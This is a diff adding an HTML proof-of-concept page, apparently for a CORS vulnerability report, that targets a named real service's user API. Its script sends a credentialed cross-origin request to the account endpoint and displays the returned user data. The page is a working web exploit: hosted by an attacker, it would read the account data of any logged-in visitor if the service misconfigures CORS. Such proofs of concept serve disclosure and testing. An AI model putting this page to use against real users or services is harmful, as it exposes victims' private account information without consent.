@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Immutable CORS PoC</title>
+</head>
+<body>
+  <h2>Immutable CORS PoC</h2>
+  <button onclick="test()">Send CORS Request</button>
+  <pre id="output"></pre>
+
+  <script>
+    async function test() {
+      const res = await fetch("https://passport.immutable.com/api/user", {
+        method: "GET",
+        credentials: "include"
+      });
+
+      const text = await res.text();
+      document.getElementById("output").textContent = text;
+    }
+  </script>
+</body>
+</html>
